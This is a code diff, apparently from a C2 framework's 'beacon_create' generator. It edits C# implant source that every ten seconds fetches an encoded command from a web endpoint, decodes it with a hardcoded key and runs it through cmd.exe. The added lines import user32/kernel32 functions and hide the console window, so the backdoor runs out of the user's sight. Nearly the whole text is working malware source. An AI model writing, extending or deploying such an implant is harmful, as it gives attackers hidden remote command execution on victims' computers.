@@ -9,29 +9,40 @@ function beacon_create($id)
     using System.Diagnostics;
     using System.Net;
     using System.Threading;
+    using System.Runtime.InteropServices;
+    using System.IO;
 
     namespace test
     {
         class Programm
         {
+        
+            [DllImport("kernel32.dll")]
+            private static extern IntPtr GetConsoleWindow();
+
+            [DllImport("user32.dll")]
+            private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
             static void Main(string[] args)
             {
                 string key = "super";
-            
+
+                IntPtr hWnd = GetConsoleWindow();
+                ShowWindow(hWnd, 0);
+
                 byte[] ba_key = Encoding.Default.GetBytes(key);
 
                 string hex_key = BitConverter.ToString(ba_key);
 
                 hex_key = hex_key.Replace("-", "");
-            
+
                 while(true)
                 {
                     Thread.Sleep(10000);
                     string dec_cypher = webget();
 
                     exec(decode(hex_key, dec_cypher));
-                }   
+                }
 
             }
 
@@ -68,7 +79,7 @@ function beacon_create($id)
 
             public static void exec(string cmd)
             {
-            
+ 
                 Process process = new Process();
                 process.StartInfo.FileName = "cmd.exe"; // the CMD executable to use
                 process.StartInfo.Arguments = "/c " + cmd; // the command to run
